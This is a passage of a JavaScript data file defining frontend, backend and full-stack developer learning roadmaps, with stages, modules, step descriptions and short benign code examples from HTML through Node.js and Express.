export const roadmaps = {
    frontend: {
        title: 'Frontend Development Roadmap',
        stages: [
            {
                title: 'HTML',
                modules: [
                    {
                        id: 'html-basics',
                        title: 'Basic HTML',
                        steps: [
                            { id: 'html-1', title: 'HTML Syntax', description: 'Understand tags, elements, and attributes.', example: '<p class="text">Hello</p>\n<br />' },
                            { id: 'html-2', title: 'Document Structure', description: 'Learn about <!DOCTYPE>, <html>, <head>, and <body>.', example: '<!DOCTYPE html>\n<html>\n  <head>...</head>\n  <body>...</body>\n</html>' },
                            { id: 'html-3', title: 'Text Formatting', description: 'Headings, paragraphs, bold, italic, lists.', example: '<h1>Title</h1>\n<ul><li>Item</li></ul>' },
                            { id: 'html-4', title: 'Links and Images', description: 'Creating hyperlinks and embedding images.', example: '<a href="url">Link</a>\n<img src="img.jpg" />' },
                            { id: 'html-comments', title: 'Comments', description: 'How to write comments in HTML.', example: '<!-- This is a comment -->' },
                            { id: 'html-attributes', title: 'Global Attributes', description: 'class, id, style, title, hidden.', example: '<div id="main" class="container" hidden>...</div>' },
                            { id: 'html-lists', title: 'Lists (Ordered & Unordered)', description: 'Creating lists with usually bullets or numbers.', example: '<ul><li>Item 1</li></ul>\n<ol><li>Step 1</li></ol>' },
                            { id: 'html-tables', title: 'Tables', description: 'Displaying data in rows and columns.', example: '<table><tr><td>Data</td></tr></table>' },
                            { id: 'html-block-inline', title: 'Block vs Inline', description: 'Understanding display behavior of elements.', example: '<div> is block, <span> is inline.' },
                            { id: 'html-filepaths', title: 'File Paths', description: 'Absolute vs Relative paths.', example: './image.png vs /images/logo.png' },
                            { id: 'html-video-audio', title: 'Video & Audio', description: 'Embedding media files.', example: '<video src="movie.mp4" controls></video>' },
                            { id: 'html-meta', title: 'Meta Tags', description: 'SEO and metadata.', example: '<meta name="description" content="My website">' },
                            { id: 'html-iframe', title: 'Iframes', description: 'Embedding other documents.', example: '<iframe src="https://example.com"></iframe>' },
                            { id: 'html-entities', title: 'HTML Entities', description: 'Reserved characters.', example: '&lt; &gt; &amp; &nbsp;' },
                            { id: 'html-favicon', title: 'Favicon', description: 'Website icon in browser tab.', example: '<link rel="icon" href="favicon.ico">' }
                        ]
                    },
                    {
                        id: 'html-intermediate',
                        title: 'Forms & Semantics',
                        steps: [
                            { id: 'html-5', title: 'Form Basics', description: 'Input types (text, password, email, number), labels.', example: '<form><input type="email" /></form>' },
                            { id: 'html-form-attributes', title: 'Form Attributes', description: 'action, method, autocomplete, novalidate.', example: '<form action="/submit" method="POST">...</form>' },
                            { id: 'html-form-elements', title: 'Form Elements', description: 'textarea, select, button, fieldset, legend, datalist.', example: '<select><option>A</option></select>' },
                            { id: 'html-input-types', title: 'Input Types', description: 'checkbox, radio, range, date, file, color.', example: '<input type="color" />' },
                            { id: 'html-input-attributes', title: 'Input Attributes', description: 'value, readonly, disabled, size, maxlength, min, max, multiple, pattern, placeholder, required, step, autofocus.', example: '<input required placeholder="Name" />' },
                            { id: 'html-7', title: 'Semantic HTML', description: 'Using meaningful tags: <header>, <nav>, <main>, <section>, <article>, <aside>, <footer>.', example: '<article><h1>Blog Post</h1>...</article>' }
                        ]
                    },
                    {
                        id: 'html-advanced',
                        title: 'Advanced HTML',
                        steps: [
                            { id: 'html-8', title: 'SEO Best Practices', description: 'Proper heading hierarchy, alt text, semantic structure.', example: '<img src="cat.jpg" alt="A cute cat" />' },
                            { id: 'html-9', title: 'Accessibility (a11y)', description: 'ARIA roles, semantic landmarks, keyboard navigation.', example: '<button aria-label="Close Menu">X</button>' },
                            { id: 'html-10', title: 'Graphics (Canvas & SVG)', description: 'Drawing graphics and using vector images directly in HTML.', example: '<svg width="100" height="100">...</svg>' },
                            { id: 'html-api-geo', title: 'Geolocation API', description: 'Getting user location (requires JS, but HTML5 API).', example: 'navigator.geolocation.getCurrentPosition(...)' },
                            { id: 'html-api-store', title: 'Web Storage API', description: 'localStorage and sessionStorage.', example: 'localStorage.setItem("key", "val")' },
                            { id: 'html-api-worker', title: 'Web Workers', description: 'Background scripts.', example: 'new Worker("worker.js")' }
                        ]
                    },
                ],
                project: 'Build a multi-page personal website (Home, About, Contact) using purely semantic HTML.'
            },
            {
                title: 'CSS',
                modules: [
                    {
                        id: 'css-basics',
                        title: 'Basic CSS',
                        steps: [
                            { id: 'css-syntax', title: 'Syntax & Selectors', description: 'Element, Class, ID, Grouping, Universal selectors.', example: 'h1, p { color: blue; }' },
                            { id: 'css-import', title: 'Ways to Insert CSS', description: 'External, Internal, Inline.', example: '<link rel="stylesheet" href="style.css">' },
                            { id: 'css-colors', title: 'Colors', description: 'Names, RGB, HEX, HSL.', example: 'color: #ff0000;' },
                            { id: 'css-backgrounds', title: 'Backgrounds', description: 'Color, Image, Repeat, Attachment, Position.', example: 'background-image: url("bg.png");' },
                            { id: 'css-borders', title: 'Borders', description: 'Width, Style, Color, Radius.', example: 'border: 1px solid black; border-radius: 5px;' },
                            { id: 'css-margins-padding', title: 'Margins & Padding', description: 'Spacing outside and inside elements.', example: 'margin: 10px; padding: 20px;' },
                            { id: 'css-height-width', title: 'Height & Width', description: 'Setting dimensions, max-width.', example: 'width: 50%; max-width: 600px;' },
                            { id: 'css-box-model', title: 'The Box Model', description: 'Understanding Content, Padding, Border, Margin.', example: 'box-sizing: border-box;' },
                            { id: 'css-outline', title: 'Outline', description: 'Line outside the border.', example: 'outline: 2px solid red;' },
                            { id: 'css-text', title: 'Text Formatting', description: 'Color, Alignment, Decoration, Transformation, Spacing, Shadow.', example: 'text-align: center; text-transform: uppercase;' },
                            { id: 'css-fonts', title: 'Fonts', description: 'Family, Style, Size, Weight, Google Fonts.', example: 'font-family: "Roboto", sans-serif;' },
                            { id: 'css-icons', title: 'Icons', description: 'Using icon libraries (FontAwesome, Material Icons).', example: '<i class="fa fa-home"></i>' }
                        ]
                    },
                    {
                        id: 'css-layout',
                        title: 'CSS Layouts',
                        steps: [
                            { id: 'css-display', title: 'Display Property', description: 'block, inline, inline-block, none.', example: 'display: inline-block;' },
                            { id: 'css-position', title: 'Positioning', description: 'static, relative, fixed, absolute, sticky.', example: 'position: absolute; top: 0; left: 0;' },
                            { id: 'css-overflow', title: 'Overflow', description: 'visible, hidden, scroll, auto.', example: 'overflow-y: scroll;' },
                            { id: 'css-float', title: 'Float & Clear', description: 'Legacy layout method (still useful for text wrap).', example: 'float: left; clear: both;' },
                            { id: 'css-align', title: 'Alignment', description: 'Center aligning elements.', example: 'margin: 0 auto;' },
                            { id: 'css-combinators', title: 'Combinators', description: 'Descendant, Child, Adjacent Sibling, General Sibling.', example: 'div > p { ... }' },
                            { id: 'css-pseudo-classes', title: 'Pseudo-classes', description: ':hover, :focus, :first-child, :nth-child.', example: 'a:hover { color: red; }' },
                            { id: 'css-pseudo-elements', title: 'Pseudo-elements', description: '::before, ::after, ::first-line.', example: 'p::first-line { font-weight: bold; }' },
                            { id: 'css-opacity', title: 'Opacity', description: 'Transparency.', example: 'opacity: 0.5;' },
                            { id: 'css-navbar', title: 'Navigation Bar', description: 'Creating horizontal and vertical navbars.', example: 'Using flexbox for nav.' },
                            { id: 'css-dropdown', title: 'Dropdowns', description: 'Creating hoverable dropdown menus.', example: 'Display block on hover.' }
                        ]
                    },
                    {
                        id: 'css-modern',
                        title: 'Modern CSS (Flexbox & Grid)',
                        steps: [
                            { id: 'css-flexbox', title: 'Flexbox', description: 'Container, Items, Direction, Wrap, Justify, Align.', example: 'display: flex; justify-content: space-between;' },
                            { id: 'css-grid', title: 'CSS Grid', description: 'Container, Items, Columns, Rows, Gap, Areas.', example: 'display: grid; grid-template-columns: 1fr 1fr 1fr;' },
                            { id: 'css-media', title: 'Media Queries', description: 'Responsive design for different screen sizes.', example: '@media (max-width: 768px) { ... }' },
                            { id: 'css-images', title: 'Responsive Images', description: 'Images that scale nicely.', example: 'width: 100%; height: auto;' }
                        ]
                    },
                    {
                        id: 'css-advanced',
                        title: 'Advanced CSS',
                        steps: [
                            { id: 'css-units', title: 'CSS Units', description: 'px, %, em, rem, vh, vw.', example: 'font-size: 1.2rem;' },
                            { id: 'css-vars', title: 'CSS Variables', description: 'Custom properties for reusability.', example: ':root { --main-color: #333; } var(--main-color)' },
                            { id: 'css-transitions', title: 'Transitions', description: 'Smooth changes.', example: 'transition: all 0.3s ease;' },
                            { id: 'css-animations', title: 'Animations', description: '@keyframes, animation properties.', example: '@keyframes slide { ... }' },
                            { id: 'css-shadows', title: 'Shadows', description: 'Text-shadow and Box-shadow.', example: 'box-shadow: 0 4px 8px rgba(0,0,0,0.1);' },
                            { id: 'css-transforms', title: 'Transforms', description: 'Translate, Rotate, Scale, Skew.', example: 'transform: rotate(45deg);' },
                            { id: 'css-sass', title: 'Sass/SCSS', description: 'CSS Preprocessor (Variables, Nesting, Mixins).', example: '.container { p { color: red } }' },
                            { id: 'css-tailwind', title: 'Tailwind CSS', description: 'Utility-first framework.', example: 'class="text-center font-bold"' }
                        ]
                    },
                ],
                project: 'Build a responsive landing page with a navigation bar, hero section, features grid, and footer, using Flexbox and Grid.'
            },
            {
                title: 'JavaScript',
                modules: [
                    {
                        id: 'js-basics',
                        title: 'Basic JavaScript',
                        steps: [
                            { id: 'js-intro', title: 'Introduction', description: 'Adding JS to HTML, Console log.', example: '<script src="app.js"></script>' },
                            { id: 'js-variables', title: 'Variables', description: 'var, let, const.', example: 'const pi = 3.14;' },
                            { id: 'js-datatypes', title: 'Data Types', description: 'String, Number, BigInt, Boolean, Undefined, Null, Symbol, Object.', example: 'typeof "hello" // string' },
                            { id: 'js-operators', title: 'Operators', description: 'Arithmetic, Assignment, Comparison, Logical, Type.', example: 'x === 5 && y < 10' },
                            { id: 'js-functions', title: 'Functions', description: 'Declaration, Expression, Invocation, Return, Parameters.', example: 'function add(a, b) { return a + b; }' },
                            { id: 'js-objects', title: 'Objects', description: 'Properties, Methods, Accessors, Constructors.', example: 'const car = { type: "Fiat", model: "500" };' },
                            { id: 'js-events', title: 'Events', description: 'onclick, onchange, onmouseover, event handlers.', example: 'btn.addEventListener("click", ...)' },
                            { id: 'js-strings', title: 'Strings', description: 'Methods (slice, substring, replace, toUpperCase).', example: '"hello".toUpperCase()' },
                            { id: 'js-numbers', title: 'Numbers', description: 'Methods (toString, toFixed), Math Object.', example: 'Math.random()' },
                            { id: 'js-arrays', title: 'Arrays', description: 'Methods (push, pop, shift, unshift, splice, slice, sort, reverse).', example: 'arr.push("newItem")' },
                            { id: 'js-array-iteration', title: 'Array Iteration', description: 'forEach, map, filter, reduce, every, some.', example: 'arr.map(x => x * 2)' },
                            { id: 'js-dates', title: 'Dates', description: 'Date Object, formats, methods.', example: 'new Date().getFullYear()' },
                            { id: 'js-conditions', title: 'Conditionals', description: 'if, else, else if, switch, ternary operator.', example: 'age >= 18 ? "Adult" : "Minor"' },
                            { id: 'js-loops', title: 'Loops', description: 'for, for/in, for/of, while, do/while.', example: 'for (let i of arr) { ... }' }
                        ]
                    },
                    {
                        id: 'js-dom',
                        title: 'The DOM',
                        steps: [
                            { id: 'js-dom-intro', title: 'DOM Intro', description: 'Document Object Model tree.', example: 'document.body' },
                            { id: 'js-dom-methods', title: 'DOM Methods', description: 'getElementById, getElementsByClassName, querySelector.', example: 'document.querySelector("#demo")' },
                            { id: 'js-dom-css', title: 'Changing CSS', description: 'style property.', example: 'element.style.color = "red"' },
                            { id: 'js-dom-animation', title: 'DOM Animations', description: 'setInterval, setTimeout.', example: 'setInterval(frame, 10)' },
                            { id: 'js-dom-events', title: 'DOM Events', description: 'Event Listener, bubbling vs capturing.', example: 'el.addEventListener("click", fn)' },
                            { id: 'js-dom-nodes', title: 'DOM Nodes', description: 'Navigation, creating (createElement), adding (appendChild), removing.', example: 'document.createElement("p")' }
                        ]
                    },
                    {
                        id: 'js-advanced',
                        title: 'Advanced JavaScript',
                        steps: [
                            { id: 'js-es6', title: 'ES6+ Features', description: 'Arrow Functions, Spread/Rest, Destructuring, Template Literals, Modules.', example: 'const add = (a, b) => a + b;' },
                            { id: 'js-json', title: 'JSON', description: 'Parsing and Stringifying.', example: 'JSON.parse(text)' },
                            { id: 'js-bom', title: 'The BOM', description: 'Window, Screen, Location, History, Navigator (Cookies).', example: 'window.location.href' },
                            { id: 'js-web-api', title: 'Web APIs', description: 'Forms, History, Storage, Worker, Fetch, Geolocation.', example: 'fetch("url")' },
                            { id: 'js-ajax', title: 'AJAX', description: 'XMLHttpRequest (Legacy), Request, Response.', example: 'Making requests without reload.' },
                            { id: 'js-async', title: 'Asynchronous JS', description: 'Callbacks, Promises, Async/Await.', example: 'async function getData() { await fetch(...) }' },
                        ]
                    },
                ],
                project: 'Build a dynamic "Todo List" application where users can add, edit, delete, and mark tasks as complete. Use LocalStorage to save data.'
            },
            {
                title: 'React',
                modules: [
                    {
                        id: 'react-basics',
                        title: 'React Fundamentals',
                        steps: [
                            { id: 'react-intro', title: 'Introduction', description: 'SPA, Virtual DOM, Create React App / Vite.', example: 'npm create vite@latest my-app' },
                            { id: 'react-jsx', title: 'JSX', description: 'Writing HTML similar syntax in JS.', example: 'const el = <h1>Hello</h1>;' },
                            { id: 'react-components', title: 'Components', description: 'Class vs Function components.', example: 'function Welcome() { return <h1>Hi</h1>; }' },
                            { id: 'react-props', title: 'Props', description: 'Passing data down to components.', example: '<Welcome name="Sara" />' },
                            { id: 'react-state', title: 'State (useState)', description: 'Managing local component state.', example: 'const [count, setCount] = useState(0);' },
                            { id: 'react-lifecycle', title: 'Lifecycle (useEffect)', description: 'Mounting, Updating, Unmounting effects.', example: 'useEffect(() => { ... }, [])' },
                            { id: 'react-events', title: 'Events', description: 'Handling events (onClick, onChange).', example: '<button onClick={shoot}>Safe</button>' },
                            { id: 'react-conditionals', title: 'Conditional Rendering', description: 'if, &&, ternary.', example: '{isLoggedIn && <LogoutButton />}' },
                            { id: 'react-lists', title: 'Lists & Keys', description: 'Rendering arrays (map).', example: 'todos.map(todo => <li key={todo.id}>...</li>)' },
                            { id: 'react-forms', title: 'Forms', description: 'Controlled components.', example: '<input value={name} onChange={...} />' }
                        ]
                    },
                    {
                        id: 'react-advanced',
                        title: 'Intermediate React',
                        steps: [
                            { id: 'react-router', title: 'React Router', description: 'Client-side routing.', example: '<Route path="/" element={<Home />} />' },
                            { id: 'react-memo', title: 'Memoization', description: 'React.memo, useMemo, useCallback.', example: 'const memoizedValue = useMemo(() => ...)' },
                            { id: 'react-refs', title: 'Refs (useRef)', description: 'Accessing DOM directly, preserving values.', example: 'const inputRef = useRef();' },
                            { id: 'react-context', title: 'Context API', description: 'Global state management basics.', example: 'createContext, useContext.' },
                            { id: 'react-custom-hooks', title: 'Custom Hooks', description: 'Reusing logic.', example: 'function useFetch(url) { ... }' }
                        ]
                    },
                    {
                        id: 'react-ecosystem',
                        title: 'React Ecosystem',
                        steps: [
                            { id: 'react-redux', title: 'Redux / Redux Toolkit', description: 'Complex state management.', example: 'useSelector, useDispatch.' },
                            { id: 'react-query', title: 'TanStack Query', description: 'Server state management (data fetching).', example: 'useQuery("todos", fetchTodos)' },
                            { id: 'react-styling', title: 'Styling', description: 'CSS Modules, Styled Components, Tailwind.', example: 'styled.div` color: red; `' },
                            { id: 'react-testing', title: 'Testing', description: 'Jest, React Testing Library.', example: 'render(<App />);' }
                        ]
                    },
                ],
                project: 'Build a Movie Search App using React and a public API (like OMDB). Implement search, pagination, and details view.'
            },
            {
                title: 'Real World Projects',
                modules: [
                    {
                        id: 'frontend-projects',
                        title: 'Build Portfolio Projects',
                        steps: [
                            { id: 'proj-1', title: 'E-commerce Product Page', description: 'Build a product details page with image gallery and add-to-cart.', example: 'Like Amazon product page.' },
                            { id: 'proj-2', title: 'Dashboard UI', description: 'Create an admin dashboard with charts and tables.', example: 'Using Chart.js or Recharts.' }
                        ]
                    }
                ],
                project: "Build an e-commerce product catalog with a shopping cart."
            }
        ],
    },
    backend: {
        title: "Backend Development Roadmap",
        stages: [
            {
                title: "Basics of Backend",
                modules: [
                    {
                        id: "backend-basics-foundations",
                        title: "Foundational Concepts",
                        steps: [
                            { id: "basics-1", title: "Understand What Backend Development Is", description: "Learn the role of the backend in the client-server architecture. It handles business logic, database interactions, and API responses.", example: "The waiter (backend) takes the order from the customer (frontend) to the kitchen (database)." },
                            { id: "basics-2", title: "Client-Server Architecture", description: "Understand how clients (browsers, mobile apps) communicate with servers via HTTP/HTTPS.", example: "Request -> Server -> Response" },
                            { id: "basics-3", title: "HTTP Protocols & Methods", description: "Learn about GET, POST, PUT, DELETE, status codes (200, 404, 500), and headers.", example: "GET /users (Fetch users), POST /users (Create user)" },
                            { id: "basics-4", title: "DNS & How the Web Works", description: "Understand Domain Name Systems, IP addresses, and how a URL is resolved to a server.", example: "google.com -> 142.250.190.46" }
                        ]
                    },
                    {
                        id: "backend-basics-os",
                        title: "OS & Terminal",
                        steps: [
                            { id: "os-1", title: "Basic Terminal Commands", description: "Learn navigation (cd, ls, pwd), file manipulation (mkdir, touch, rm), and permissions (chmod).", example: "mkdir my-project && cd my-project" },
                            { id: "os-2", title: "Process Management", description: "Understand processes, threads, and how to manage them (ps, kill, top).", example: "kill -9 <PID>" },
                            { id: "os-3", title: "Environment Variables", description: "Learn how to store secrets and configuration outside of code.", example: "export DB_PASSWORD=secret" }
                        ]
                    },
                    {
                        id: "backend-basics-vcs",
                        title: "Version Control (Git)",
                        steps: [
                            { id: "git-1", title: "Git Basics", description: "Init, clone, add, commit, push, pull.", example: "git commit -m 'Initial commit'" },
                            { id: "git-2", title: "Branching & Merging", description: "Working with branches, resolving conflicts, and pull requests.", example: "git checkout -b feature-login" },
                            { id: "git-3", title: "GitHub/GitLab", description: "Hosting repositories and collaborating.", example: "Pushing code to a remote repo." }
                        ]
                    }
                ],
                project: "Set up a GitHub repository and practice basic Git commands. Create a README.md explaining what you learned."
            },
            {
                title: "Programming Language (Choose One)",
                modules: [
                    {
                        id: "backend-lang-node",
                        title: "Node.js (JavaScript)",
                        steps: [
                            { id: "node-1", title: "Node.js Runtime", description: "Understand the event loop, non-blocking I/O, and the V8 engine.", example: "Running JS outside the browser." },
                            { id: "node-2", title: "NPM/Yarn", description: "Package management, package.json, and dependencies.", example: "npm install express" },
                            { id: "node-3", title: "Modules (CommonJS vs ES Modules)", description: "Importing and exporting code.", example: "require('fs') vs import fs from 'fs'" },
                            { id: "node-4", title: "Async Programming", description: "Callbacks, Promises, and Async/Await.", example: "await fs.readFile('file.txt')" }
                        ]
                    },
                    {
                        id: "backend-lang-python",
                        title: "Python",
                        steps: [
                            { id: "py-1", title: "Python Syntax", description: "Variables, loops, functions, classes.", example: "def hello(): print('Hello')" },
                            { id: "py-2", title: "PIP & Virtual Environments", description: "Managing packages and isolating dependencies.", example: "pip install requests" },
                            { id: "py-3", title: "File Handling", description: "Reading and writing files.", example: "open('file.txt', 'r')" }
                        ]
                    }
                ],
                project: "Write a CLI tool (in Node.js or Python) that takes a user's name and saves it to a file."
            },
            {
                title: "Databases",
                modules: [
                    {
                        id: "backend-db-relational",
                        title: "Relational Databases (SQL)",
                        steps: [
                            { id: "sql-1", title: "SQL Basics", description: "SELECT, INSERT, UPDATE, DELETE.", example: "SELECT * FROM users;" },
                            { id: "sql-2", title: "Table Design", description: "Primary keys, foreign keys, data types.", example: "CREATE TABLE users (id INT PRIMARY KEY...)" },
                            { id: "sql-3", title: "Joins & Relationships", description: "One-to-one, one-to-many, many-to-many.", example: "JOIN orders ON users.id = orders.user_id" },
                            { id: "sql-4", title: "Normalization", description: "Organizing data to reduce redundancy.", example: "1NF, 2NF, 3NF" },
                            { id: "sql-5", title: "PostgreSQL/MySQL", description: "Setting up and connecting to a database server.", example: "psql -U postgres" }
                        ]
                    },
                    {
                        id: "backend-db-nosql",
                        title: "NoSQL Databases",
                        steps: [
                            { id: "nosql-1", title: "Document Stores (MongoDB)", description: "Collections, documents, JSON-like structure.", example: "db.users.find({})" },
                            { id: "nosql-2", title: "Key-Value Stores (Redis)", description: "Caching and fast lookups.", example: "SET user:1 'Alice'" }
                        ]
                    },
                    {
                        id: "backend-db-orm",
                        title: "ORMs & ODMs",
                        steps: [
                            { id: "orm-1", title: "Using an ORM", description: "Prisma, Sequelize, TypeORM (Node) or SQLAlchemy (Python).", example: "await prisma.user.create(...)" },
                            { id: "orm-2", title: "Migrations", description: "Managing database schema changes over time.", example: "prisma migrate dev" }
                        ]
                    }
                ],
                project: "Design a database schema for a simple blog (Users, Posts, Comments) and write SQL queries to fetch data."
            },
            {
                title: "Building APIs",
                modules: [
                    {
                        id: "backend-api-rest",
                        title: "RESTful APIs",
                        steps: [
                            { id: "rest-1", title: "REST Principles", description: "Statelessness, resources, standard methods.", example: "GET /articles/1" },
                            { id: "rest-2", title: "Express.js (Node) / Flask (Python)", description: "Setting up a server and defining routes.", example: "app.get('/', (req, res) => ...)" },
                            { id: "rest-3", title: "Request & Response Objects", description: "Handling headers, body, query params.", example: "req.body, res.json({...})" },
                            { id: "rest-4", title: "Middleware", description: "Logging, error handling, authentication checks.", example: "app.use(cors())" }
                        ]
                    },
                    {
                        id: "backend-api-auth",
                        title: "Authentication & Security",
                        steps: [
                            { id: "auth-1", title: "Hashing Passwords", description: "Never store plain text passwords. Use bcrypt or Argon2.", example: "bcrypt.hash(password, 10)" },
                            { id: "auth-2", title: "JWT (JSON Web Tokens)", description: "Stateless authentication mechanism.", example: "jwt.sign({ id: user.id }, secret)" },
                            { id: "auth-3", title: "OAuth 2.0", description: "Login with Google/GitHub.", example: "Passport.js strategies." },
                            { id: "auth-4", title: "CORS & Helmet", description: "Securing headers and handling cross-origin requests.", example: "app.use(helmet())" }
                        ]
                    }
                ],
                project: "Build a REST API for a Todo App with User Authentication (Register, Login, CRUD Todos)."
            },
            {
                title: "Deployment & DevOps Basics",
                modules: [
                    {
                        id: "backend-deploy",
                        title: "Deployment",
                        steps: [
                            { id: "deploy-1", title: "PaaS Providers", description: "Deploying to Heroku, Vercel, or Render.", example: "git push heroku main" },
                            { id: "deploy-2", title: "Docker Basics", description: "Containerizing applications.", example: "docker build -t my-app ." },
                            { id: "deploy-3", title: "CI/CD Basics", description: "Automating tests and deployment (GitHub Actions).", example: ".github/workflows/deploy.yml" }
                        ]
                    }
                ],
                project: "Dockerize your API and deploy it to a free hosting service (like Render)."
            }
        ]
    },
    fullstack: {
        title: "Full-Stack Development Roadmap",
        stages: [
            {
                title: "Frontend Foundations",
                modules: [
                    {
                        id: "fs-fe-1", title: "HTML & CSS Mastery",
                        steps: [
                            { id: "fs-html-1", title: "Semantic HTML5", description: "Use meaningful tags: header, nav, main, article, section, aside, footer.", example: "<article><h1>Post</h1><p>Content</p></article>" },
                            { id: "fs-html-2", title: "Forms & Validation", description: "Build forms with proper input types, labels, and HTML5 validation.", example: "<input type='email' required />" },
                            { id: "fs-html-3", title: "Accessibility (a11y)", description: "ARIA labels, keyboard nav, semantic roles.", example: "<button aria-label='Close'>X</button>" },
                            { id: "fs-css-1", title: "CSS Specificity & Cascade", description: "Understand how browsers apply styles.", example: "!important < inline < id < class < element" },
                            { id: "fs-css-2", title: "Flexbox Layout", description: "1D layout for rows and columns.", example: "display:flex; justify-content:space-between;" },
                            { id: "fs-css-3", title: "CSS Grid Layout", description: "2D layout system for complex designs.", example: "grid-template-columns: repeat(3, 1fr);" },
                            { id: "fs-css-4", title: "Responsive Design", description: "Media queries and mobile-first approach.", example: "@media (max-width:768px) { ... }" },
                            { id: "fs-css-5", title: "CSS Variables", description: "Custom properties for theme management.", example: ":root { --color: #333; }" },
                            { id: "fs-css-6", title: "CSS Animations", description: "@keyframes and transition properties.", example: "transition: all 0.3s ease;" },
                            { id: "fs-css-7", title: "CSS Preprocessors", description: "Sass/SCSS for nesting, mixins, and variables.", example: "$primary: #333; .btn { color: $primary; }" },
                            { id: "fs-css-8", title: "Utility CSS Frameworks", description: "Tailwind CSS utility-first approach.", example: "class='flex items-center justify-between'" },
                            { id: "fs-css-9", title: "CSS Architecture (BEM)", description: "Block-Element-Modifier naming convention.", example: ".card__title--active { ... }" },
                            { id: "fs-css-10", title: "Dark Mode", description: "prefers-color-scheme and CSS variable switching.", example: "@media (prefers-color-scheme: dark) { ... }" },
                            { id: "fs-css-11", title: "Pseudo-classes & Pseudo-elements", description: ":hover, :focus, ::before, ::after.", example: "a:hover::after { content: '→'; }" },
                            { id: "fs-css-12", title: "CSS Clamp & Modern Units", description: "clamp(), min(), max(), ch, rem, dvh.", example: "font-size: clamp(1rem, 2.5vw, 2rem);" },
                            { id: "fs-css-13", title: "CSS Transforms", description: "translate, rotate, scale, skew in 2D/3D.", example: "transform: rotate(45deg) scale(1.2);" },
                            { id: "fs-css-14", title: "Box Model Mastery", description: "content, padding, border, margin and box-sizing.", example: "box-sizing: border-box;" },
                            { id: "fs-css-15", title: "Stacking Context & Z-index", description: "How layering works in CSS.", example: "position: relative; z-index: 10;" },
                            { id: "fs-css-16", title: "CSS Filters & Blending", description: "filter, mix-blend-mode, backdrop-filter.", example: "backdrop-filter: blur(10px);" },
                            { id: "fs-css-17", title: "Print Stylesheets", description: "Optimizing content for printing.", example: "@media print { nav { display:none; } }" },
                            { id: "fs-css-18", title: "CSS Logical Properties", description: "Writing-mode independent layout.", example: "margin-inline-start: auto;" }
                        ]
                    },
                    {
                        id: "fs-fe-2", title: "JavaScript & React",
                        steps: [
                            { id: "fs-js-1", title: "ES6+ Fundamentals", description: "Arrow functions, destructuring, spread, template literals.", example: "const [a, ...rest] = [1,2,3];" },
                            { id: "fs-js-2", title: "Promises & Async/Await", description: "Handling asynchronous operations cleanly.", example: "const data = await fetch('/api').then(r=>r.json());" },
                            { id: "fs-js-3", title: "Modules (ESM)", description: "import/export for code splitting.", example: "import { helper } from './utils.js';" },
                            { id: "fs-js-4", title: "DOM Manipulation", description: "querySelector, addEventListener, createElement.", example: "document.querySelector('#app').innerHTML = '...';" },
                            { id: "fs-js-5", title: "Event Loop & Concurrency", description: "How JS executes code, call stack, microtasks.", example: "setTimeout vs Promise resolution order." },
                            { id: "fs-js-6", title: "Error Handling", description: "try/catch/finally, custom errors.", example: "try { await api() } catch(e) { console.error(e) }" },
                            { id: "fs-js-7", title: "LocalStorage & SessionStorage", description: "Persisting data in the browser.", example: "localStorage.setItem('token', jwt);" },
                            { id: "fs-js-8", title: "React Components & JSX", description: "Functional components and JSX syntax.", example: "const Card = ({ title }) => <div>{title}</div>;" },
                            { id: "fs-js-9", title: "useState & useEffect", description: "Managing state and side effects.", example: "const [data, setData] = useState(null);" },
                            { id: "fs-js-10", title: "Props & Component Composition", description: "Passing data & children between components.", example: "<Button onClick={handleClick}>Submit</Button>" },
                            { id: "fs-js-11", title: "React Router", description: "Client-side routing with React Router v6.", example: "<Route path='/users/:id' element={<User/>} />" },
                            { id: "fs-js-12", title: "Context API", description: "Sharing global state without prop drilling.", example: "const ctx = createContext(); useContext(ctx);" },
                            { id: "fs-js-13", title: "Custom Hooks", description: "Extracting reusable logic into hooks.", example: "function useFetch(url) { const [data] = useState()... }" },
                            { id: "fs-js-14", title: "useRef & useCallback", description: "Refs for DOM access, callback memoization.", example: "const ref = useRef(); ref.current.focus();" },
                            { id: "fs-js-15", title: "React Query / SWR", description: "Data fetching, caching, and synchronization.", example: "const { data } = useQuery('users', fetchUsers);" },
                            { id: "fs-js-16", title: "Form Handling (React Hook Form)", description: "Performant form validation and submission.", example: "const { register, handleSubmit } = useForm();" },
                            { id: "fs-js-17", title: "State Management (Zustand/Redux)", description: "Global state for complex apps.", example: "const useStore = create(set => ({ count: 0 }));" },
                            { id: "fs-js-18", title: "Code Splitting & Lazy Loading", description: "Load components only when needed.", example: "const Page = React.lazy(() => import('./Page'));" },
                            { id: "fs-js-19", title: "Testing with Vitest & RTL", description: "Unit and integration testing.", example: "render(<App/>); expect(screen.getByText('Hi')).toBeInTheDocument();" },
                            { id: "fs-js-20", title: "Performance Optimization", description: "Memoization, virtualization, bundle analysis.", example: "React.memo(Component), useMemo(() => compute(), [dep]);" }
                        ]
                    }
                ],
                project: "Build a responsive multi-page portfolio site with React Router and a contact form."
            },
            {
                title: "Backend Foundations",
                modules: [
                    {
                        id: "fs-be-1", title: "Node.js & Express",
                        steps: [
                            { id: "fs-node-1", title: "Node.js Runtime", description: "Event loop, non-blocking I/O, V8 engine.", example: "node app.js" },
                            { id: "fs-node-2", title: "NPM & package.json", description: "Managing dependencies, scripts, versioning.", example: "npm init -y && npm install express" },
                            { id: "fs-node-3", title: "CommonJS vs ESM", description: "require() vs import/export in Node.", example: "import express from 'express';" },
                            { id: "fs-node-4", title: "Express Setup", description: "Creating a server, routes, and middleware.", example: "const app = express(); app.listen(3000);" },
                            { id: "fs-node-5", title: "Routing", description: "GET, POST, PUT, DELETE routes.", example: "app.get('/users', (req,res) => res.json(users));" },
                            { id: "fs-node-6", title: "Middleware", description: "express.json(), cors(), custom middleware.", example: "app.use(cors()); app.use(express.json());" },
                            { id: "fs-node-7", title: "Environment Variables", description: "dotenv for hiding secrets.", example: "require('dotenv').config(); process.env.DB_URI" },
                            { id: "fs-node-8", title: "Error Handling Middleware", description: "Centralized error handler.", example: "app.use((err,req,res,next)=>res.status(500).json({err}));" },
                            { id: "fs-node-9", title: "File System (fs module)", description: "Reading/writing files asynchronously.", example: "await fs.readFile('data.txt', 'utf-8');" },
                            { id: "fs-node-10", title: "Streams & Buffers", description: "Handling large data efficiently.", example: "fs.createReadStream('large.csv').pipe(parser);" },
                            { id: "fs-node-11", title: "Request Validation", description: "Joi or express-validator for input sanitization.", example: "body('email').isEmail().normalizeEmail()" },
                            { id: "fs-node-12", title: "Rate Limiting", description: "Prevent abuse with express-rate-limit.", example: "rateLimit({ windowMs: 15*60*1000, max: 100 })" },
